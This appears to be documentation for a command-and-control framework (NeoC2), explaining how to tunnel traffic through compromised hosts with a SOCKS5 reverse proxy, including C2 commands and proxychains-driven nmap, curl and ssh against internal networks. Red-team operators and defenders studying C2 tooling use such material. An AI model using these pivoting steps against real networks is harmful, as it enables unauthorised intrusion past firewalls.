# SOCKS5 Reverse Proxy

The reverse proxy functionality allows you to route traffic through compromised hosts using a SOCKS5 proxy. This guide explains how to use this feature for network pivoting.

## Overview

The SOCKS5 pivot feature enables you to:
- Access internal networks through compromised hosts
- Route tool traffic through the C2 channel
- Perform DNS resolution from the target network (not your machine)
- Bypass network restrictions and firewalls

## Compatibility

- Trinity
- Morpheus Agent


## Step-by-Step Instructions

### Step 1: Start Server-Side Reverse Proxy:

```
NeoC2 (user@remote) > reverse_proxy start <agent_id> [port]
```

What it does:

- C2 server's agent manager starts listening on port 5555 for the specified agent
- Creates a server socket bound to 0.0.0.0:5555 for that agent
- Waits for the agent to connect and establish the SOCKS5 server protocol

For example:

```
NeoC2 (user@remote) > reverse_proxy start 4c98e214-9616-4c0c-9998-d7268ca9f838
```

### Step 2: Make Agent Connect to Server

Send `reverse_proxy_start` command to the agent (via interactive mode or standard queued task):

```
NeoC2 (user@remote) > addcmd <agent_id> reverse_proxy_start
```

What it does:

- Instructs Agent to connect to C2 server's IP address on port 5555
- Agent implements full SOCKS5 server protocol (waits for client requests)
- Establishes persistent connection between agent and C2 server

For example:

```
NeoC2 (user@remote) > addcmd 4c98e214-9616-4c0c-9998-d7268ca9f838 reverse_proxy_start
```

### Step 3: Start SOCKS5 Proxy Chain

```
NeoC2 (user@remote) > socks <agent_id> [port]
```

What it does:

- C2 server starts CLI SOCKS proxy on port 1080 for the agent
- CLI starts local SOCKS proxy on specified port (default 1080)
- When user tools connect to local proxy, they connect to server's CLI proxy
- Server bridges connections from CLI proxy to agent's established connection

```
NeoC2 (user@remote) >  socks 4c98e214-9616-4c0c-9998-d7268ca9f838 1080
```

### Step 3: Use SOCKS5 Proxy

#### Using curl:

```
curl --socks5 127.0.0.1:1080 http://127.0.0.1
```

#### Using proxychains:

Edit `/etc/proxychains4.conf` and add:
```
[ProxyList]
socks5 127.0.0.1 1080
```

Then use tools through proxychains:

```bash
proxychains nmap -sT 10.0.0.0/24
proxychains curl http://internal-site.local
proxychains ssh user@internal-host
```

#### Using other tools:
- **Burp Suite**: Configure upstream proxy to 127.0.0.1:1080
- **Firefox/Chrome**: Configure browser proxy settings
- **Nmap**: `nmap --proxies socks5://127.0.0.1:1080`

#### Network Flow:

```
User Tool → Local CLI Proxy → Server CLI Proxy → Agent → Target Service
(127.0.0.1:1080) → (Server:1080) → (Server:5555) → (Agent) → (Internal Service)
```

### Step 4: Stop the Proxy (When Done)

To stop the local SOCKS proxy, press `Ctrl+C` in the CLI where the `socks` command is running.

To stop the reverse proxy on the C2 Server and Agent:
```
NeoC2 (user@remote) > reverse_proxy stop <agent_id>
NeoC2 (user@remote) > addcmd <agent_id> reverse_proxy_stop
```


## Important Notes

- The agent must be Go-based agent with the updated template
- The command `reverse_proxy` is separate from `reverse_proxy_start` (do not confuse the two) One is for the sever-side, the other is an agent command, respectively.
- The agent performs DNS resolution on the target network (not on your machine)
- Supports IPv4, IPv6, and domain name resolution
- All traffic is encrypted through the C2 channel
- Use `Ctrl+C` to stop the local SOCKS proxy server
- The default reverse proxy port is 5555 on the C2 server
- The default local SOCKS proxy port is 1080

## Troubleshooting

### Common Issues:
- **Connection Refused**: Verify the agent is running and reverse proxy is started
- **DNS Resolution**: The agent resolves domain names, not your local machine
- **Port Conflicts**: Use different local ports if 1080 is already in use
- **Timeout Issues**: Increase tool timeouts as traffic routes through C2 channel

### Verification Steps:
1. Confirm agent is active: `agent list`
2. Verify reverse proxy started: Check agent response
3. Test local proxy: `curl --socks5 127.0.0.1:1080 http://127.0.0.1`
